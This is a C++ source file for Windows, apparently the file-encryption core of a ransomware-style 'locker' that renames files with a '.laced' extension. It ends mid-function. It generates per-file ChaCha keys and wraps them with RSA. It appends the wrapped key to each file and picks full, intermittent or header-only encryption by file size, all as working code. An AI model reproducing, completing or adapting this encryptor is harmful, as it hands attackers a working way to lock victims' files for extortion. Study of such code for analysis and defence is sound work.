#include <windows.h>
#include <fileapi.h>
#include <stdio.h>
#include <string>
#include <map>

#include "filesystem.h"
#include "memory.h"
#include "global_parameters.h"
#include "sha/sha256.h"

#define ECRYPT_NAME_P L".laced"
#define ECRYPT_NAME_LEN 6

#define SET(v,w) ((v) = (w))

STATIC BOOL VER = FALSE;


STATIC BOOL WriteFullData
(
	HANDLE hFile,
	LPVOID Buffer,
	DWORD Size
)
{
	DWORD TotalWritten = 0;
	DWORD BytesWritten = 0;
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{

		if (!WriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten)
		{
			return FALSE;
		}

		Offset += BytesWritten;
		TotalWritten += BytesWritten;
		BytesToWrite -= BytesWritten;
	}
	
	/*
	DWORD BytesWritten;
	do
	{
		if(ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL))
			WriteFile(hFile2, FileBuffer, dwread, &BytesWritten, NULL);
	} while (dwread < BytesRead);*/

	return TRUE;
}

BOOL filesystem::getParseFile
(
	locker::PFILE_INFO FileInfo
)
{	
	HANDLE hFile = NULL;	
	hFile = CreateFileW(FileInfo->FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);	

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf_s("File %ls is already open by another program.\n", FileInfo->FilePath);
		FileInfo->FileHandle = hFile;
		return FALSE;
	}
	FileInfo->FileHandle = hFile;

	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(hFile, &FileSize))
	{
		printf_s("The file %ls must not be empty.\n", FileInfo->FilePath);
		return FALSE;
	}
	if (!FileSize.QuadPart)
	{
		printf_s("The file %ls must not be empty.\n", FileInfo->FilePath);
		return FALSE;
	}
	FileInfo->Filesize = FileSize.QuadPart;
	return TRUE;
}

BOOL filesystem::EncryptFileFullData
(
	locker::PFILE_INFO FileInfo,
	WCHAR* newFilename
)
{
	DWORD BytesRead = FileInfo->Filesize;
	BYTE* FileBuffer = NULL;
	FileBuffer = (BYTE*)memory::m_malloc(BytesRead);
	if (!FileBuffer)
	{
		printf_s("Large File Size %ls. Buffer heap crash\n", FileInfo->Filename);
		return FALSE;
	}

	DWORD dwread = 0;	
	if (!ReadFile(FileInfo->FileHandle, FileBuffer, BytesRead, &dwread, NULL))
	{
		printf_s("File %ls is failed to ReadFile.\n", FileInfo->Filename);
		memory::m_free(FileBuffer);		
		return FALSE;
	}
	HANDLE hNewFile = NULL;
	hNewFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
	if (hNewFile == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed Create File %ls GetLastError = %lu\n", newFilename, GetLastError());
		memory::m_free(FileBuffer);
		FileInfo->newFileHandle = hNewFile;
		return FALSE;
	}
	FileInfo->newFileHandle = hNewFile;

	LARGE_INTEGER Offset;
	Offset.QuadPart = -((LONGLONG)BytesRead);	
	if (!SetFilePointerEx(hNewFile, Offset, NULL, FILE_END)) {  }
	
	ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, FileBuffer, FileBuffer, BytesRead);
	
	if (!WriteFullData(hNewFile, FileBuffer, BytesRead))
	{
		printf_s("File %ls is failed to write\n", FileInfo->Filename);
		memory::m_free(FileBuffer);
		return FALSE;
	}

	memory::m_free(FileBuffer);	
	return TRUE;
}


BOOL filesystem::EncryptFilePartly
(
	locker::PFILE_INFO FileInfo,
	WCHAR* newFilename,
	BYTE DataPercent
)
{
	BOOL SUCCESS = FALSE;
	DWORD BytesRead;
	DWORD BytesReadW;
	LONGLONG TotalRead;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	INT StepsCount = 0;
	LONGLONG Size = FileInfo->Filesize;
	DataPercent = 20;
	if (FileInfo->bit)
		Size -= FileInfo->bit;
	switch (DataPercent)
	{
	case 20:
		PartSize = (Size / 100) * 7;
		StepsCount = 3;
		StepSize = (Size - (PartSize * 3)) / 2;
		break;

	case 50:
		PartSize = (Size / 100) * 10;
		StepsCount = 5;
		StepSize = PartSize;
		break;

	default:
		return FALSE;
	}

	BYTE* BufferPart = (BYTE*)memory::m_malloc(PartSize);
	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
	if (!BufferPart || !BufferStep)
	{
		printf_s("Heap crash.\n");
		return FALSE;
	}

	HANDLE hFile = NULL;
	hFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf_s("File %ls is already open by another program.\n", newFilename);
		FileInfo->newFileHandle = hFile;
		memory::m_free(BufferPart);
		memory::m_free(BufferStep);
		return FALSE;
	}
	FileInfo->newFileHandle = hFile;


	for (INT i = 0; i < StepsCount; ++i)
	{
		if (!ReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead, NULL) || !BytesRead)
		{	 
			printf_s("File %ls is failed to Read Data.\n", FileInfo->FilePath);
			memory::m_free(BufferPart);
			memory::m_free(BufferStep);
			return FALSE;
		}

		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, BufferPart, BufferPart, BytesRead);

		if (!WriteFullData(hFile, BufferPart, BytesRead))
		{
			printf_s("File %ls is failed to Write data.\n", newFilename);
			memory::m_free(BufferPart);
			memory::m_free(BufferStep);
			return FALSE;
		}
		TotalRead = 0;
		while (TotalRead < StepSize)
		{
			if (!ReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW, NULL) || !BytesReadW)
				break;
			if (!WriteFullData(hFile, BufferStep, BytesReadW))
				break;
			TotalRead += BytesReadW;
		}
	}

	memory::m_free(BufferPart);
	memory::m_free(BufferStep);	

	return TRUE;
}

BOOL filesystem::EncryptFileBlock
(
	locker::PFILE_INFO FileInfo,
	WCHAR* newFilename
)
{
	DWORD BytesRead;
	CHAR* Buffer = (CHAR*)memory::m_malloc(1048576); // 1 MB
	if (!Buffer)
	{
		printf_s("Failed alloc memory\n");
		return FALSE;
	}
	HANDLE hCryptFile = NULL;
	hCryptFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
	if (hCryptFile == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed Create File %ls\n", newFilename);
		FileInfo->newFileHandle = hCryptFile;
		return FALSE;
	}
	FileInfo->newFileHandle = hCryptFile;

	while(ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
	{
		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)Buffer, (BYTE*)Buffer, BytesRead);

		if (!WriteFullData(hCryptFile, Buffer, BytesRead))
		{
			printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
			return FALSE;
		}		
	}


	memory::m_free(Buffer);
	
	
	return TRUE;
}

BOOL filesystem::EncryptFileHeader
(
	locker::PFILE_INFO FileInfo,
	WCHAR* newFilename
)
{
	if (FileInfo->Filesize < 1048576)
	{
		printf_s("For EncryptFileHeader FileSize must be > 1 MB. %ls\n", FileInfo->Filename);
		return FALSE;
	}
	HANDLE hCryptFile = NULL;
	hCryptFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
	FileInfo->newFileHandle = hCryptFile;
	if (hCryptFile == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed Create File %ls\n", newFilename);
		return FALSE;
	}	

	DWORD BytesEncrypt = 1048576;
	DWORD BytesRead;
	DWORD TotalRead = 0;
	BYTE* Buffer = NULL;
	Buffer = (BYTE*)memory::m_malloc(BytesEncrypt);

	while (TotalRead < BytesEncrypt)
	{
		if (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL) || !BytesRead)
		{
			printf_s("File %ls is failed to Read Data.\n", FileInfo->FilePath);
			memory::m_free(Buffer);
			return FALSE;
		}
		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);
		if (!WriteFullData(hCryptFile, Buffer, BytesRead))
		{
			printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
			memory::m_free(Buffer);
			return FALSE;
		}
		TotalRead += BytesRead;
	}
	
	while (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL) || BytesRead != 0)
	{
		if (!WriteFullData(hCryptFile, Buffer, BytesRead))
		{
			printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
			memory::m_free(Buffer);
			return FALSE;
		}		
	}

	memory::m_free(Buffer);
	return TRUE;
}

BOOL filesystem::ReadFile_
(
	locker::PFILE_INFO FileInfo
)
{
	HANDLE hFile = CreateFileW(FileInfo->FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf_s("File %ls is already open by another program.\n", FileInfo->Filename);
		CloseHandle(hFile);
		return FALSE;
	}

	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(hFile, &FileSize))
	{
		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
		CloseHandle(hFile);
		return FALSE;
	}
	if (!FileSize.QuadPart)
	{
		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
		CloseHandle(hFile);
		return FALSE;
	}

	LPSTR FileBuffer = (CHAR*)memory::m_malloc(FileSize.QuadPart);
	if (!FileBuffer)
	{
		memory::m_free(FileBuffer);
		CloseHandle(hFile);
		return FALSE;
	}

	DWORD dwread = 0;
	BOOL Success = ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL);
	DWORD BytesRead = FileSize.QuadPart;
	if (!Success || dwread != BytesRead)
	{
		printf_s("File %ls is failed to ReadFile.\n", FileInfo->FilePath);
		memory::m_free(FileBuffer);
		CloseHandle(FileInfo->FileHandle);
		return FALSE;
	}

	BOOL SUCCESSS;

	LARGE_INTEGER Offset;
	Offset.QuadPart = -((LONGLONG)dwread);

	ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)FileBuffer, (BYTE*)FileBuffer, BytesRead);

	printf_s("%s", FileBuffer);

	RtlSecureZeroMemory(FileBuffer, sizeof(FileBuffer));
	memory::m_free(FileBuffer);
	CloseHandle(hFile);


	return TRUE;
}


HMODULE hCrypt32 = NULL;
CryptBinaryToStringA_t pCryptBinaryToStringA = NULL;
CryptStringToBinaryA_t pCryptStringToBinaryA = NULL;
CryptBinaryToStringW_t pCryptBinaryToStringW = NULL;
CryptStringToBinaryW_t pCryptStringToBinaryW = NULL;


BOOL LoadCrypt32()
{
	if (!hCrypt32)
		hCrypt32 = LoadLibraryA("Crypt32.dll");
	if (hCrypt32 != NULL)
	{
		pCryptBinaryToStringA = (CryptBinaryToStringA_t)GetProcAddress(hCrypt32, "CryptBinaryToStringA");
		pCryptStringToBinaryA = (CryptStringToBinaryA_t)GetProcAddress(hCrypt32, "CryptStringToBinaryA");
		pCryptBinaryToStringW = (CryptBinaryToStringW_t)GetProcAddress(hCrypt32, "CryptBinaryToStringW");
		pCryptStringToBinaryW = (CryptStringToBinaryW_t)GetProcAddress(hCrypt32, "CryptStringToBinaryW");
	}
	else return FALSE;
	return TRUE;
}

VOID UnLoadCrypt32()
{
	if (hCrypt32)
	{
		FreeLibrary(hCrypt32);
		hCrypt32 = NULL;
	}
}


STATIC BOOL Base64Encode
(	
	VOID** ptr_Base64,
	BYTE* BuffKey,
	size_t SizeKey,
	DWORD* return_size,
	size_t mode
)
{
	DWORD size = 0;
		
	if (mode == BINARY_CRYPT) // Binary -> Base64  
	{
		if (!pCryptBinaryToStringA)
		{
			printf("Failed to get function address Crypt32.dll\n");			
			return FALSE;
		}
		if (!pCryptBinaryToStringA(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
		{
			printf("Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());			
			return FALSE;
		}

		*ptr_Base64 = (CHAR*)memory::m_malloc(size);
		if (!pCryptBinaryToStringA(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (CHAR*)*ptr_Base64, &size))
		{
			printf("Failed to convert KEY to Base64. GetLastError = %lu\n", GetLastError());			
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}
	}
	else if(mode == BASE_CRYPT)// Base64 -> Binary
	{
		if (!pCryptStringToBinaryA)
		{
			printf("Failed to get function address Crypt32.dll\n");
			return FALSE;
		}
		if (!pCryptStringToBinaryA((CHAR*)BuffKey, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL))
		{
			printf("Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}
		
		*ptr_Base64 = (BYTE*)memory::m_malloc(size);
		if (!pCryptStringToBinaryA((CHAR*)BuffKey, 0, CRYPT_STRING_BASE64, (BYTE*)*ptr_Base64, &size, NULL, NULL))
		{
			printf("Failed to convert KEY to Base64. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}		
	}
	else if (mode == BINARY_CRYPT_W)
	{
		if (!pCryptBinaryToStringW)
		{
			printf("Failed to get function address Crypt32.dll\n");
			return FALSE;
		}

		if (!pCryptBinaryToStringW(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
		{
			printf("Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}

		*ptr_Base64 = (WCHAR*)memory::m_malloc(size * sizeof(WCHAR));
		if (!pCryptBinaryToStringW(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (WCHAR*)*ptr_Base64, &size))
		{
			printf("Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}
	}
	else if (mode == BASE_CRYPT_W)
	{
		if (!pCryptStringToBinaryW)
		{
			printf("Failed to get function address Crypt32.dll\n");
			return FALSE;
		}

		if (!pCryptStringToBinaryW((WCHAR*)BuffKey, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL))
		{
			printf("Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}

		*ptr_Base64 = (BYTE*)memory::m_malloc(size);
		if(!pCryptStringToBinaryW((WCHAR*)BuffKey, 0, CRYPT_STRING_BASE64, (BYTE*)*ptr_Base64, &size, NULL, NULL))
		{
			printf("Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}
	}
	
	
	*return_size = size;
	return TRUE;
}

BOOL filesystem::DropRSAKey
(
	WCHAR* Path,
	BYTE PublicKey[],
	BYTE PrivateKey[],
	DWORD SizeKey,
	DWORD p_SizeKey
)
{
	BOOL SUCCESS_return = FALSE;
	HANDLE hFile_prv = NULL;
	HANDLE hFile_pub = NULL;
	std::wstring key_pub(Path);	
	key_pub += std::wstring(L"/RSA_public_key_laced.txt");
	printf_s("Path public_key_file\t%ls\n", key_pub.c_str());
	
	hFile_pub = CreateFileW(key_pub.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	std::wstring key_prv(Path);	
	key_prv += std::wstring(L"/RSA_private_key_laced.txt");
	printf_s("Path private_key_file\t%ls\n", key_prv.c_str());

	hFile_prv = CreateFileW(key_prv.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hFile_pub == INVALID_HANDLE_VALUE || hFile_prv == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed create key files %ls. GetLastError = %lu\n", Path, GetLastError());
		goto END;
	}

	if (global::GetRsaBase64())
	{
		VOID* Base64PublicKey = NULL;
		VOID* Base64PrivateKey = NULL;
		DWORD size_pub;
		DWORD size_prv;

		if (!Base64Encode(&Base64PublicKey, PublicKey, SizeKey, &size_pub, BINARY_CRYPT))
		{
			printf_s("Failed Public Key convert Base64 file %ls. GetLastError = %lu\n", Path, GetLastError());
			goto ENDB;
		}
		if (!Base64Encode(&Base64PrivateKey, PrivateKey, p_SizeKey, &size_prv, BINARY_CRYPT))
		{
			printf_s("Failed Private Key convert Base64 file %ls. GetLastError = %lu\n", Path, GetLastError());
			goto ENDB;
		}
		
		if (Base64PublicKey == NULL || Base64PrivateKey == NULL)
		{
			printf_s("Failed RSA Key convert Base64 file. GetLastError = %lu\n", GetLastError());
			goto ENDB;
		}
		LARGE_INTEGER Offset;
		Offset.QuadPart = -((LONGLONG)size_pub);
		if (!SetFilePointerEx(hFile_pub, Offset, NULL, FILE_CURRENT))

		if (!WriteFullData(hFile_pub, Base64PublicKey, size_pub))
		{
			printf_s("Failed to write public key\n");
			goto ENDB;
		}


		Offset.QuadPart = -((LONGLONG)size_prv);
		if (!SetFilePointerEx(hFile_prv, Offset, NULL, FILE_CURRENT))

		if (!WriteFullData(hFile_prv, Base64PrivateKey, size_prv))
		{
			printf_s("Failed to write private key\n");
			goto ENDB;
		}

		SUCCESS_return = TRUE;

	ENDB:
		if (Base64PublicKey)
			memory::m_free(Base64PublicKey);
		if (Base64PrivateKey)
			memory::m_free(Base64PrivateKey);
		if (hFile_pub)
			CloseHandle(hFile_pub);
		if (hFile_prv)
			CloseHandle(hFile_prv);

		return SUCCESS_return;
	}


	LARGE_INTEGER Offset;
	Offset.QuadPart = -((LONGLONG)SizeKey);
	if (!SetFilePointerEx(hFile_pub, Offset, NULL, FILE_CURRENT))

	if (!WriteFullData(hFile_pub, PublicKey, SizeKey))
	{
		printf_s("Failed to write public key\n");
		goto END;
	}


	Offset.QuadPart = -((LONGLONG)p_SizeKey);
	if (!SetFilePointerEx(hFile_prv, Offset, NULL, FILE_CURRENT))

	if (!WriteFullData(hFile_prv, PrivateKey, p_SizeKey))
	{
		printf_s("Failed to write private key\n");
		goto END;
	}


	if (GetLastError() && GetLastError() != 131)
		printf_s("GetLastError %lu CheckWINAPI %ls\n", GetLastError(), Path);

	SUCCESS_return = TRUE;
	
END:
	if(hFile_pub)
		CloseHandle(hFile_pub);
	if(hFile_prv)
		CloseHandle(hFile_prv);

	return SUCCESS_return;
}



STATIC BOOL ReadRSAFile
(
	WCHAR* KeyFile,
	BYTE* BuffRSA,
	HCRYPTKEY* RsaKey,
	HCRYPTPROV* CryptoProvider
)

{
	BOOL SUCCESS_return = FALSE;
	HANDLE hCryptFile = NULL;	
	DWORD sizeKey;
	DWORD dwread;

	if (VER)
	{
		if (!CryptAcquireContextA(CryptoProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		{
			printf_s("Failed create provider. GetLastError = %lu.\n", GetLastError());
			return FALSE;
		}
	}
	else
	{
		if (!CryptAcquireContextA(CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			printf_s("Failed create provider. GetLastError = %lu.\n", GetLastError());
			return FALSE;
		}
	}
	


	hCryptFile = CreateFileW(KeyFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hCryptFile == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed create key files. %ls. GetLastError = %lu\n", KeyFile, GetLastError());
		return FALSE;
	}
	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(hCryptFile, &FileSize) || FileSize.QuadPart == 0)
	{
		printf_s("The file %ls must not be empty.\n", KeyFile);
		goto END;
	}

	sizeKey = FileSize.QuadPart;
	if (!ReadFile(hCryptFile, BuffRSA, sizeKey, &dwread, NULL) || dwread != FileSize.QuadPart)
	{
		printf_s("Key %ls is failed to ReadFile.\n", KeyFile);
		goto END;
	}

	if (global::GetRsaBase64())
	{
		VOID* Base64Key = NULL;
		DWORD size;
		if (!Base64Encode(&Base64Key, BuffRSA, sizeKey, &size, BASE_CRYPT))
		{
			printf_s("Failed RSA Key convert Base64 file %ls. GetLastError = %lu\n", KeyFile, GetLastError());
			goto END;
		}

		if (Base64Key == NULL)
		{
			printf_s("Failed RSA Key convert Base64 file %ls. GetLastError = %lu\n", KeyFile, GetLastError());
			goto END;
		}		
				
		if (!CryptImportKey(*CryptoProvider, (BYTE*)Base64Key, size, 0, 0, RsaKey))
		{
			printf_s("Failed import Key. GetLastError = %lu.\n", GetLastError());
			memory::m_free(Base64Key);
			goto END;
		}
		memory::m_free(Base64Key);
		SUCCESS_return = TRUE;
		goto END;
	}
	
	if (!CryptImportKey(*CryptoProvider, BuffRSA, dwread, 0, 0, RsaKey))
	{
		printf_s("Failed import Key. GetLastError = %lu.\n", GetLastError());
		printf_s("if key in Base64 format - check flag -Base64\n");
		goto END;
	}
	SUCCESS_return = TRUE;
END:
	if (hCryptFile != NULL && hCryptFile != INVALID_HANDLE_VALUE)
		CloseHandle(hCryptFile);
	return SUCCESS_return;
}


/*ONLY RSA & ONLY (RSA_BIT - 11) >= FILESIZE*/
BOOL filesystem::EncryptRSA 
(	
	WCHAR* KeyFile,
	WCHAR* Filename,
	WCHAR* newFilename	
)
{
	HCRYPTPROV CryptoProvider = 0;
	HCRYPTKEY RsaKey = 0;
	BOOL SUCCESS_return = FALSE;

	HANDLE hCryptFile = INVALID_HANDLE_VALUE;
	HANDLE hCryptFile_out = INVALID_HANDLE_VALUE;
	LARGE_INTEGER FileSize;

	BYTE* FileBuffer = NULL;

	DWORD size = 0;
	DWORD dwDataLen = 0;

	BYTE BuffKey[4096] = { 0 };
	
	if(!ReadRSAFile(KeyFile, BuffKey, &RsaKey, &CryptoProvider))
	{
		printf_s("Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
		return FALSE;
	}

	hCryptFile = CreateFileW(Filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	hCryptFile_out = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);

	if (hCryptFile == INVALID_HANDLE_VALUE || hCryptFile_out == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed create key files %ls - GetLastError = %lu\n", Filename, GetLastError());
		goto END;
	}
	
	if (!GetFileSizeEx(hCryptFile, &FileSize))
	{
		printf_s("Failed GetFileSize size must be not empty. %ls. GetLastError = %lu\n", Filename, GetLastError());
		goto END;
	}	
		
	if (!CryptEncrypt(RsaKey, 0, TRUE, 0, NULL, &dwDataLen, 0))
	{
		printf_s("Failed get size CryptEncrypt. GetLastError = %lu\n", GetLastError());
		printf_s("NTE_BAD_LEN - %lu\tRSA_BIT > FILESIZE\n", NTE_BAD_LEN);
		goto END;
	}
	size = FileSize.QuadPart;
	FileBuffer = (BYTE*)memory::m_malloc(dwDataLen + 32);

	if (!ReadFile(hCryptFile, FileBuffer, size, &size, NULL))
	{
		printf_s("File %ls is failed to ReadFile. GetLastError = %lu\n", Filename, GetLastError());
		goto END;
	}
	

	if (global::GetDeCrypt() == CRYPT)
	{
		if (!CryptEncrypt(RsaKey, 0, TRUE, 0, FileBuffer, &size, dwDataLen))
		{
			printf_s("Failed CryptEncrypt. GetLastError = %lu\n", GetLastError());
			printf_s("NTE_BAD_LEN - %lu\tRSA_BIT > FILESIZE\n", NTE_BAD_LEN);
			goto END;
		}
	}
	else if (global::GetDeCrypt() == DECRYPT)
	{
		if (!CryptDecrypt(RsaKey, 0, TRUE, 0, FileBuffer, &size))
		{
			printf_s("Failed CryptDecrypt. GetLastError = %lu\n", GetLastError());
			printf_s("NTE_BAD_LEN - %lu\tRSA_BIT > FILESIZE\n", NTE_BAD_LEN);
			goto END;
		}
	}

	if (!WriteFullData(hCryptFile_out, FileBuffer, size))
	{
		printf_s("Failed to write. GetLastError = %lu\n", GetLastError());
		goto END;
	}
	
	SUCCESS_return = TRUE;
	
END:
	
	if(hCryptFile && hCryptFile != INVALID_HANDLE_VALUE)
		CloseHandle(hCryptFile);
	if(hCryptFile_out && hCryptFile_out != INVALID_HANDLE_VALUE)
		CloseHandle(hCryptFile_out);
	if (FileBuffer)
	{
		RtlSecureZeroMemory(FileBuffer, dwDataLen);
		memory::m_free(FileBuffer);
	}
	if (RsaKey)
		CryptDestroyKey(RsaKey);
	if (CryptoProvider)
		CryptReleaseContext(CryptoProvider, 0);		

	return SUCCESS_return;
}




STATIC BOOL GenKey
(
	locker::PFILE_INFO FileInfo,
	HCRYPTPROV Provider,
	HCRYPTKEY PublicKey,
	BYTE* ChachaKey,
	BYTE* ChachaIV,
	BYTE* EncryptedKey,
	size_t BuffLenBytes
)
{
	DWORD dwDataLen = 40;

	if (!CryptGenRandom(Provider, 32, ChachaKey))
	{
		return FALSE;
	}

	if (!CryptGenRandom(Provider, 8, ChachaIV))
	{
		return FALSE;
	}

	RtlSecureZeroMemory(&FileInfo->CryptCtx, sizeof(FileInfo->CryptCtx));
	ECRYPT_keysetup(&FileInfo->CryptCtx, ChachaKey, 256, 64);
	ECRYPT_ivsetup(&FileInfo->CryptCtx, ChachaIV);

	memory::Copy(EncryptedKey, ChachaKey, 32);
	memory::Copy(EncryptedKey + 32, ChachaIV, 8);

	if (!CryptEncrypt(PublicKey, 0, TRUE, 0, EncryptedKey, &dwDataLen, BuffLenBytes))
	{
		printf_s("Failed crypt RSA key. GetLastError = %lu.\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


STATIC BOOL WriteEncryptInfo
(
	locker::PFILE_INFO FileInfo,
	BYTE* EncryptedKey,
	size_t size,
	INT EncryptMode	
)
{
	BYTE Buffer[4];
	memset((VOID*)Buffer, 0, 4);
	Buffer[0] = EncryptMode + 100;
	std::string strbit = std::to_string((size + 1) << 31 | (size + 1) >> 1);
	memcpy_s((VOID*)&Buffer[1], 3, strbit.c_str(), strbit.size());
	LARGE_INTEGER Offset;
	Offset.QuadPart = 0;
	
	if (!SetFilePointerEx(FileInfo->newFileHandle, Offset, NULL, FILE_END))
	{
		printf_s("Failed write key for file %ls. GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

	if (!WriteFullData(FileInfo->newFileHandle, EncryptedKey, size))
	{
		printf_s("Failed write key for file %ls. GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

	if (!WriteFullData(FileInfo->newFileHandle, Buffer, 4))
	{
		printf_s("Failed write key for file %ls. GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL filesystem::FileCryptEncrypt
(
	WCHAR* KeyFile,
	WCHAR* FileCrypt,
	WCHAR* newFilename
)
{	
	locker::FILE_INFO FileInfo;
	FileInfo.Filename = FileCrypt;
	FileInfo.FilePath = FileCrypt;
	FileInfo.newFilename = newFilename;
	FileInfo.bit = 0;
	FileInfo.FileHandle = NULL;
	FileInfo.newFileHandle = NULL;
	HCRYPTPROV CryptoProvider = 0;
	HCRYPTKEY RsaKey = 0;
	HANDLE hCryptFile = NULL;
	BOOL SUCCESS_return = FALSE;
	BYTE* EncryptedKey = NULL;	
	DWORD size = 0;	
	BYTE PublicKey[4096] = { 0 };

	if (!ReadRSAFile(KeyFile, PublicKey, &RsaKey, &CryptoProvider))
	{
		printf_s("Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
		return FALSE;
	}
	

	if (!getParseFile(&FileInfo) || FileInfo.FileHandle == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed getParseInfo %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
		goto END;
	}
	
	CryptEncrypt(RsaKey, 0, TRUE, 0, NULL, &size, 0);
	if (size == 0)
	{
		printf_s("Failed get LenthBitRSA %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
		return FALSE;
	}
	size += 13;
	EncryptedKey = (BYTE*)memory::m_malloc(size);
	BYTE ChachaIV[8];
	BYTE ChachaKey[32];
	if (!GenKey(&FileInfo, CryptoProvider, RsaKey, ChachaKey, ChachaIV, EncryptedKey, size))
	{
		printf_s("Can't gen key for file %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
		goto END;
	}

	if (global::GetEncMode() == AUTO_ENCRYPT)
	{
		if (FileInfo.Filesize <= 1048576)
		{			
			if (!EncryptFileFullData(&FileInfo, newFilename))
			{
				printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
				goto END;
			}			
			WriteEncryptInfo(&FileInfo, EncryptedKey, size, FULL_ENCRYPT);
		}
		else if (FileInfo.Filesize <= 5242880)
		{
			if (!EncryptFilePartly(&FileInfo, newFilename, 20))
			{
				printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
				goto END;
			}
			WriteEncryptInfo(&FileInfo, EncryptedKey, size, PARTLY_ENCRYPT);
		}
		else
		{
			if (!EncryptFileHeader(&FileInfo, newFilename))
			{
				printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
				goto END;
			}
			WriteEncryptInfo(&FileInfo, EncryptedKey, size, HEADER_ENCRYPT);
		}
	}
	else if (global::GetEncMode() == FULL_ENCRYPT)	
	{		
		if (!EncryptFileFullData(&FileInfo, newFilename))
		{
			printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}		
		WriteEncryptInfo(&FileInfo, EncryptedKey, size, FULL_ENCRYPT);
	}
	else if (global::GetEncMode() == PARTLY_ENCRYPT)	
	{		
		if(!EncryptFilePartly(&FileInfo, newFilename, 20))
		{
